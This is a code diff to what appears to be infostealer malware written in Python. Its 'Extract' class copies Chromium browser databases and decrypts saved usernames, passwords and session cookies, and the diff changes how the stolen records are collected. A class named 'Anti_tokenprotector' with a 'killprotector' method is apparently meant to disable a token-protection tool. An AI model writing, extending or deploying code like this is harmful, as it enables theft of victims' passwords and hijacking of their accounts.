@@ -66,7 +66,7 @@ class Extract:
                 return "No Passwords"
             
     def extractPasswords(self, passwdFile: str):
-        passwords = {}
+        passwords = []
         tempfile = utils.random_string.get(10)
 
         shutil.copyfile(passwdFile, tempfile)
@@ -77,11 +77,12 @@ class Extract:
         "select origin_url, action_url, username_value, password_value from logins")
 
         for row in cursor.fetchall():
-            passwords[row[0]] = {
+            passwords.append({
+                "url": row[0],
                 "action_url": row[1],
                 "username": row[2],
-                "password": self.decryption(row[3], self.key)}
-
+                "password": self.decryption(row[3], self.key)})
+            
         cursor.close()
         db.close()
 
@@ -122,7 +123,7 @@ class Extract:
         return history
     
     def extractCookies(self, browserPath: str):
-        cookies = {}
+        cookies = []
         tempfile = utils.random_string.get(10)
         if os.path.exists(os.path.join(browserPath, "Network")):
             cookiesPath = os.path.join(browserPath, "Network", "Cookies")
@@ -132,10 +133,10 @@ class Extract:
         shutil.copy(cookiesPath, tempfile)
         db = sqlite3.connect(tempfile)
         cursor = db.cursor()
-        cursor.execute("select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite from cookies")
+        cursor.execute("select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite, has_expires from cookies")
 
         for row in cursor.fetchall():
-            cookies[row[0]] = {"name": row[1], "value": self.decryption(row[2], self.key), "path": row[3], "expires": row[4], "secure": row[5], "httponly": row[6], "sameSite": row[7]}
+            cookies.append({"host": row[0],"name": row[1], "value": self.decryption(row[2], self.key), "path": row[3], "expires": row[4], "secure": row[5], "httponly": row[6], "sameSite": row[7], "has_expires": row[8]})
 
         cursor.close()
         db.close()
@@ -144,7 +145,6 @@ class Extract:
         except: pass
 
         return cookies
-
 
 class Anti_tokenprotector:
     def killprotector():
